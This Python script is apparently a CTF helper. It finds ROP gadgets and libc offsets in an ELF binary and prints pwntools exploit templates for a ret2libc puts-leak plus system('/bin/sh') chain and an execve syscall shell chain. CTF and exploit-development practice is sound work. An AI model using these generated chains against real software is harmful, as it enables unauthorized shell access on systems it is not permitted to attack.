#!/usr/bin/env python3
"""
rop_finder.py — ROP gadget finder and chain builder for CTF pwn challenges.
Wraps ROPgadget/ropper, finds useful gadgets, and suggests common chain patterns.
Usage: python3 rop_finder.py <binary> [--pattern PATTERN] [--chain TYPE]
Chain types: execve, mprotect, ret2libc, syscall
"""

import sys
import re
import subprocess
import argparse
from pathlib import Path


def run(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr
    except Exception as e:
        return '', str(e)


def find_tool():
    for tool in ('ROPgadget', 'ropper', 'rp++'):
        out, _ = run(f'{tool} --version 2>/dev/null | head -1')
        if out.strip():
            return tool
    return None


def get_gadgets_ropgadget(binary):
    out, _ = run(f'ROPgadget --binary "{binary}" --rop --nojop 2>/dev/null')
    gadgets = {}
    for line in out.splitlines():
        m = re.match(r'(0x[0-9a-f]+)\s*:\s*(.+)', line)
        if m:
            gadgets[m.group(2).strip()] = int(m.group(1), 16)
    return gadgets


def get_gadgets_ropper(binary):
    out, _ = run(f'ropper --file "{binary}" --nocolor 2>/dev/null')
    gadgets = {}
    for line in out.splitlines():
        m = re.match(r'(0x[0-9a-f]+):\s*(.+?);\s*$', line)
        if m:
            gadgets[m.group(2).strip()] = int(m.group(1), 16)
    return gadgets


def find_key_gadgets(gadgets):
    """Find the most useful gadgets for common ROP patterns."""
    wanted = {
        'pop rdi; ret':          None,
        'pop rsi; ret':          None,
        'pop rsi; pop r15; ret': None,
        'pop rdx; ret':          None,
        'pop rax; ret':          None,
        'pop rbp; ret':          None,
        'pop rcx; ret':          None,
        'syscall; ret':          None,
        'syscall':               None,
        'int 0x80; ret':         None,
        'ret':                   None,
        'leave; ret':            None,
        'mov rdi, rsp; ret':     None,
        'mov rdi, rbp; ret':     None,
        'xor rax, rax; ret':     None,
        'xor eax, eax; ret':     None,
        'pop rsp; ret':          None,
        'add rsp, 8; ret':       None,
    }
    for pattern in wanted:
        # Exact match first
        if pattern in gadgets:
            wanted[pattern] = gadgets[pattern]
        else:
            # Fuzzy: check if any gadget contains this
            for g, addr in gadgets.items():
                if pattern in g:
                    wanted[pattern] = addr
                    break
    return wanted


def get_libc_offsets(binary):
    """Try to find libc base and useful offsets."""
    out, _ = run(f'ldd "{binary}" 2>/dev/null')
    libc_path = None
    for line in out.splitlines():
        m = re.search(r'libc.*=>\s*(\S+)', line)
        if m:
            libc_path = m.group(1)
            break

    if not libc_path:
        return None

    result = {'path': libc_path}

    # Find system, execve, /bin/sh
    for sym in ('system', 'execve', 'puts', 'printf', 'read', 'write', '__libc_start_main'):
        out2, _ = run(f'nm -D "{libc_path}" 2>/dev/null | grep " {sym}$"')
        m = re.search(r'([0-9a-f]{8,})\s+[Tw]\s+' + sym, out2)
        if m:
            result[sym] = int(m.group(1), 16)

    # Find /bin/sh string
    out3, _ = run(f'strings -t x "{libc_path}" 2>/dev/null | grep /bin/sh')
    m = re.search(r'([0-9a-f]+)\s+/bin/sh', out3)
    if m:
        result['/bin/sh'] = int(m.group(1), 16)

    return result


def suggest_chain(key_gadgets, libc, chain_type):
    print(f"\n[SUGGESTED {chain_type.upper()} CHAIN (pwntools template)]")
    print("from pwn import *")
    print(f'p = process("./{Path(sys.argv[1]).name}")')
    print("# p = remote('host', port)")
    print("elf = ELF('./" + Path(sys.argv[1]).name + "')")
    print()

    if chain_type == 'ret2libc' and libc:
        print(f"libc = ELF('{libc['path']}')")
        pop_rdi = key_gadgets.get('pop rdi; ret')
        ret_gadget = key_gadgets.get('ret')
        puts_got = "elf.got['puts']"
        puts_plt = "elf.plt['puts']"
        main_addr = "elf.sym['main']"

        print(f"\n# Stage 1: leak libc base via puts(puts@got)")
        print(f"pop_rdi = {hex(pop_rdi) if pop_rdi else '# FIND pop rdi; ret'}")
        if ret_gadget:
            print(f"ret     = {hex(ret_gadget)}  # stack alignment for Ubuntu")
        print(f"payload  = flat(")
        print(f"    b'A' * OFFSET,  # find with: cyclic(200) + gdb")
        print(f"    pop_rdi, {puts_got},")
        print(f"    {puts_plt},")
        print(f"    {main_addr},")
        print(f")")
        print(f"p.sendlineafter(b'>', payload)")
        print(f"leak = u64(p.recvline().strip().ljust(8, b'\\x00'))")
        print(f"libc.address = leak - libc.sym['puts']")
        print(f"print(f'libc base: {{libc.address:#x}}')")
        print(f"\n# Stage 2: ret2system('/bin/sh')")
        print(f"payload2 = flat(")
        if ret_gadget:
            print(f"    b'A' * OFFSET,")
            print(f"    ret,  # alignment")
        else:
            print(f"    b'A' * OFFSET,")
        print(f"    pop_rdi, next(libc.search(b'/bin/sh')),")
        print(f"    libc.sym['system'],")
        print(f")")
        print(f"p.sendlineafter(b'>', payload2)")
        print(f"p.interactive()")

    elif chain_type == 'execve':
        pop_rdi = key_gadgets.get('pop rdi; ret')
        pop_rsi = key_gadgets.get('pop rsi; ret') or key_gadgets.get('pop rsi; pop r15; ret')
        pop_rdx = key_gadgets.get('pop rdx; ret')
        pop_rax = key_gadgets.get('pop rax; ret')
        syscall = key_gadgets.get('syscall; ret') or key_gadgets.get('syscall')
        print(f"# execve('/bin/sh', NULL, NULL) syscall = 59 (0x3b)")
        print(f"pop_rdi = {hex(pop_rdi) if pop_rdi else '???'}")
        print(f"pop_rsi = {hex(pop_rsi) if pop_rsi else '???'}")
        print(f"pop_rdx = {hex(pop_rdx) if pop_rdx else '???'}")
        print(f"pop_rax = {hex(pop_rax) if pop_rax else '???'}")
        print(f"syscall = {hex(syscall) if syscall else '???'}")
        print(f"binsh   = next(elf.search(b'/bin/sh\\x00'))  # or find in libc")
        print(f"payload = flat(")
        print(f"    b'A' * OFFSET,")
        print(f"    pop_rdi, binsh,")
        print(f"    pop_rsi, 0,")
        print(f"    pop_rdx, 0,")
        print(f"    pop_rax, 59,  # SYS_execve")
        print(f"    syscall,")
        print(f")")


def main():
    ap = argparse.ArgumentParser(description='ROP Gadget Finder & Chain Builder')
    ap.add_argument('binary', help='ELF binary')
    ap.add_argument('--pattern', '-p', default=None,
                    help='Search for gadgets matching pattern')
    ap.add_argument('--chain', '-c', default=None,
                    choices=['ret2libc', 'execve', 'mprotect', 'syscall'],
                    help='Generate ROP chain template')
    ap.add_argument('--all', '-a', action='store_true',
                    help='Show all found gadgets')
    args = ap.parse_args()

    tool = find_tool()
    if not tool:
        print('[!] No ROP tool found. Install one:')
        print('    pip3 install ROPgadget')
        print('    pip3 install ropper')
        sys.exit(1)

    print(f'[+] Using: {tool}')
    print(f'[*] Scanning: {args.binary}')

    if tool == 'ROPgadget':
        gadgets = get_gadgets_ropgadget(args.binary)
    else:
        gadgets = get_gadgets_ropper(args.binary)

    print(f'[+] Found {len(gadgets)} gadgets')

    if args.pattern:
        print(f'\n[PATTERN SEARCH: "{args.pattern}"]')
        matches = {g: a for g, a in gadgets.items() if args.pattern.lower() in g.lower()}
        for gadget, addr in sorted(matches.items(), key=lambda x: x[1]):
            print(f'  {hex(addr)}: {gadget}')
        if not matches:
            print('  [none found]')

    key = find_key_gadgets(gadgets)
    print('\n[KEY GADGETS]')
    for name, addr in key.items():
        if addr:
            print(f'  {hex(addr):20s}  {name}')
        else:
            print(f'  {"MISSING":20s}  {name}')

    libc = get_libc_offsets(args.binary)
    if libc:
        print(f'\n[LIBC: {libc["path"]}]')
        for sym, off in libc.items():
            if sym != 'path':
                print(f'  {sym}: {hex(off)}')

    if args.chain:
        suggest_chain(key, libc, args.chain)

    if args.all:
        print(f'\n[ALL GADGETS]')
        for gadget, addr in sorted(gadgets.items(), key=lambda x: x[1]):
            print(f'  {hex(addr)}: {gadget}')

    print('\n[NEXT STEPS]')
    print('  1. Find offset: python3 -c "from pwn import *; print(cyclic(200))" | ./binary')
    print('     Then in GDB: cyclic_find(0x6161616e)  # value in $rsp/$eip')
    print('  2. Check protections: python3 checksec.py ./binary')
    print('  3. Find writable memory: readelf -S ./binary | grep -E "\.bss|\.data"')
    print('  4. Open in Ghidra for decompilation of vulnerable function')


if __name__ == '__main__':
    main()
